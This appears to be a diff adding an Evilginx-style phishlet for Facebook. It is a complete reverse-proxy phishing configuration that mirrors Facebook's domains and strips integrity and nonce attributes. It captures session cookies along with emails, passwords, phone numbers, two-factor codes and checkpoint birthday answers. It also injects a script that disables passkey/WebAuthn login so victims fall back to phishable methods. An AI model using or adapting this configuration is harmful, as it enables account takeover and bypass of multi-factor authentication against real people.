@@ -1,0 +1,91 @@
+min_ver: '3.0.0'
+author: '0fukuAkz'
+
+proxy_hosts:
+  # Main site — homepage shows login form directly; also handles login POST
+  - {phish_sub: 'facebook', orig_sub: 'www', domain: 'facebook.com', session: true, is_landing: true, auto_filter: true}
+  # static.xx.fbcdn.net — primary CDN for all JS/CSS bundles
+  # orig_sub 'static.xx' contains a dot: combineHost produces 'static.xx.fbcdn.net'
+  - {phish_sub: 'staticxx', orig_sub: 'static.xx', domain: 'fbcdn.net', session: false, is_landing: false, auto_filter: true}
+  # connect.facebook.net — Facebook JS SDK (needed for some auth popup flows)
+  - {phish_sub: 'fbconnect', orig_sub: 'connect', domain: 'facebook.net', session: false, is_landing: false, auto_filter: true}
+  # m.facebook.com — mobile site; post-login redirects sometimes land here
+  - {phish_sub: 'mfb', orig_sub: 'm', domain: 'facebook.com', session: true, is_landing: false, auto_filter: true}
+
+sub_filters:
+  # Strip SRI and CSP nonce on the main site
+  - {triggers_on: 'www.facebook.com', orig_sub: 'www', domain: 'facebook.com', search: ' integrity="[^"]*"', replace: '', mimes: ['text/html']}
+  - {triggers_on: 'www.facebook.com', orig_sub: 'www', domain: 'facebook.com', search: ' integrity=''[^'']*''', replace: '', mimes: ['text/html']}
+  - {triggers_on: 'www.facebook.com', orig_sub: 'www', domain: 'facebook.com', search: ' nonce="[^"]*"', replace: '', mimes: ['text/html']}
+  - {triggers_on: 'www.facebook.com', orig_sub: 'www', domain: 'facebook.com', search: ' nonce=''[^'']*''', replace: '', mimes: ['text/html']}
+  # Rewrite all facebook.com, fbcdn.net, and facebook.net origin references
+  - {triggers_on: 'www.facebook.com', orig_sub: 'www', domain: 'facebook.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'www.facebook.com', orig_sub: 'static.xx', domain: 'fbcdn.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'www.facebook.com', orig_sub: 'connect', domain: 'facebook.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'www.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  # Mobile site SRI / nonce / origin rewrites
+  - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: ' integrity="[^"]*"', replace: '', mimes: ['text/html']}
+  - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: ' integrity=''[^'']*''', replace: '', mimes: ['text/html']}
+  - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: ' nonce="[^"]*"', replace: '', mimes: ['text/html']}
+  - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: ' nonce=''[^'']*''', replace: '', mimes: ['text/html']}
+  - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'm.facebook.com', orig_sub: 'static.xx', domain: 'fbcdn.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+
+auth_tokens:
+  # c_user + xs is the critical pair — both required for authenticated API access
+  - domain: '.facebook.com'
+    keys: ['c_user', 'xs', 'fr,opt', 'sb,opt', 'datr,opt', 'wd,opt', 'presence,opt', '_js_datr,opt', 'usida,opt', 'dpr,opt', 'locale,opt', 'x-referer,opt', 'fbl_cs,opt', 'vpd,opt']
+    type: 'cookie'
+
+credentials:
+  # Facebook sends pass as plain text — no client-side encryption
+  username:
+    key: 'email'
+    search: '(.*)'
+    type: 'post'
+
+  password:
+    key: 'pass'
+    search: '(.*)'
+    type: 'post'
+
+  custom:
+    # Phone number login (alternative to email)
+    - {key: 'phone', search: '(.*)', type: 'post'}
+    # 2FA / checkpoint codes
+    - {key: 'approvals_code', search: '(.*)', type: 'post'}
+    - {key: 'otp', search: '(.*)', type: 'post'}
+    # Checkpoint identity verification
+    - {key: 'birthday_captcha_day', search: '(.*)', type: 'post'}
+    - {key: 'birthday_captcha_month', search: '(.*)', type: 'post'}
+    - {key: 'birthday_captcha_year', search: '(.*)', type: 'post'}
+
+auth_urls:
+  - '/login/'
+  - '/login/device-based/regular/login/'
+  - '/checkpoint/'
+  - '/two_step_verification/.*'
+  - '/home.php'
+  - '/groups/.*'
+
+js_inject:
+  - trigger_domains: ['www.facebook.com']
+    trigger_paths: ['.*']
+    script: |
+      (function(){
+        if(window.PublicKeyCredential){
+          window.PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable=function(){return Promise.resolve(false);};
+          window.PublicKeyCredential.isConditionalMediationAvailable=function(){return Promise.resolve(false);};
+        }
+        if(navigator.credentials&&navigator.credentials.get){
+          var _orig=navigator.credentials.get.bind(navigator.credentials);
+          navigator.credentials.get=function(o){
+            if(o&&o.publicKey)return Promise.reject(new DOMException('Not allowed','NotAllowedError'));
+            return _orig(o);
+          };
+        }
+      })();
+
+login:
+  domain: 'www.facebook.com'
+  path: '/'
